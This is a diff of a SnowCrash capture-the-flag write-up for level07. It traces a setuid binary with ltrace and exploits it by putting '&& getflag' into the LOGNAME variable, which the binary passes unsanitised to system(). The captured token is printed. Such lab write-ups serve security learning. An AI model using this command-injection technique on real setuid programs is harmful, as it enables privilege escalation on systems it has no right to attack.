@@ -1,7 +1,43 @@
-We disassemble the level07 binary and notice it's reading the LOGNAME environment variable
-then constructs a string using asprinf with the following format: "/usr/bin/echo %s" where the formated string parameter
+We see there is a binary with suid permissions in the root folder:
+
+level07@SnowCrash:~$ ls -al
+total 24
+dr-x------ 1 level07 level07  120 Mar  5  2016 .
+d--x--x--x 1 root    users    340 Aug 30  2015 ..
+-r-x------ 1 level07 level07  220 Apr  3  2012 .bash_logout
+-r-x------ 1 level07 level07 3518 Aug 30  2015 .bashrc
+-r-x------ 1 level07 level07  675 Apr  3  2012 .profile
+-rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07
+
+If we run it we get the current username echoed:
+
+level07@SnowCrash:~$ ./level07 
+level07
+
+We try multiple things and realize, using ltrace (a utility to see function calls performed by a binary) that the binary is reading the LOGNAME env variable, and after it asprintf function gets called:
+
+level07@SnowCrash:~$ ltrace ./level07
+__libc_start_main(0x8048514, 1, 0xbffff714, 0x80485b0, 0x8048620 <unfinished ...>
+getegid()                                                                                        = 2007
+geteuid()                                                                                        = 2007
+setresgid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                              = 0
+setresuid(2007, 2007, 2007, 0xb7e5ee55, 0xb7fed280)                                              = 0
+getenv("LOGNAME")                                                                                = "level07"
+asprintf(0xbffff664, 0x8048688, 0xbfffff42, 0xb7e5ee55, 0xb7fed280)                              = 18
+system("/bin/echo level07 "level07
+ <unfinished ...>
+--- SIGCHLD (Child exited) ---
+<... system resumed> )                                                                           = 0
++++ exited (status 0) +++
+
+
+We also disassemble the level07 binary and confirm it's reading the LOGNAME environment variable and
+then constructing a string using asprinf with the following format: "/usr/bin/echo %s" where the formated string parameter
 is the value of LOGNAME
 
-We execute the binary with the following payload and get the flag:
+We take advantage of this injecting the getflag command in the LOGNAME variable before executing the binary, successfuly getting the flag:
 
-LOGNAME='&& getflag' ./level07
+level07@SnowCrash:~$ LOGNAME='&& getflag' ./level07
+
+Check flag.Here is your token : fiumuikeil55xe9cu4dood66h
+
